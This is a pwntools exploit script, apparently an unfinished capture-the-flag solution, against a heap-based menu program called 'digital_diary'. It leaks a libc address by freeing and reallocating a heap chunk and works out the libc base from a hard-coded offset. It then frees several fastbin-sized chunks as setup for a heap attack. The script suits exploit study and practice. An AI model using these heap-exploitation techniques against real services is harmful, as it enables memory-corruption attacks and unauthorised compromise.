#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']

elf = context.binary = ELF('./digital_diary')
libc = elf.libc

gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript=gs)
    elif args.REM:
        return remote("",)
    else:
        return process(elf.path)


io = start()
sl      = lambda s : io.sendline(str(s))
sa      = lambda delim,data : io.sendafter(str(delim), str(data))
sla     = lambda delim,data : io.sendlineafter(str(delim), str(data))
sn      = lambda s : io.send(s)
rc      = lambda n : io.recv(n)
rl      = lambda s : io.recvline(s)
#ru = lambda s : io.recvuntil(s)
ru      = lambda delim,drop=True : io.recvuntil(delim, drop)
uu32    = lambda data            : u32(data.ljust(4, '\x00'))
uu64    = lambda data            : u64(data.ljust(8, b'\x00'))
lg      = lambda s,addr          : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
ti      = lambda : io.interactive()


#1. create secret
#2. use secret
#3. remove secret
#4. save memory
#5. view memory
#6. erase memory
#7. exit
#4
#index: 
#0
#enter size: 
#32
#enter memory: 
#AAAA 
#success.
#[+] Digital Diary [-]
#1. create secret
#2. use secret
#3. remove secret
#4. save memory
#5. view memory
#6. erase memory
#7. exit
#5
#index: 
#0
#memory : AAAA
#
#[+] Digital Diary [-]
#1. create secret
#2. use secret
#3. remove secret
#4. save memory
#5. view memory
#6. erase memory
#7. exit
#6
#index: 
#0
#success.


def c(idx):
    sl(idx)

def malloc(idx,size,data):
    c(4)
    sla("index: \n",idx)
    sla("enter size: \n",size)
    sla("enter memory: \n",data)

def show(idx):
    c(5)
    sla("index: \n",idx)

def free(idx):
    c(6)
    sla("index: \n",idx)


malloc(0,0x88,"A"*0x68)
malloc(1,0x88,"B"*0x68)
malloc(2,0x68,"C"*0x68)
free(1)

malloc(3,0x88,"")
show(3)
#io.recvuntil("memory : ")
rc(9)
addr = uu64(rc(8)[0:6])
libc.address = addr - 0x3c4b0a

lg("addr",addr)
lg("libc",libc.address)

malloc(4,0x68,"C"*0x68)
malloc(5,0x68,"C"*0x68)
malloc(6,0x68,"C"*0x68)
malloc(7,0x68,"C"*0x68)

free(4)
free(5)

input()




io.interactive()
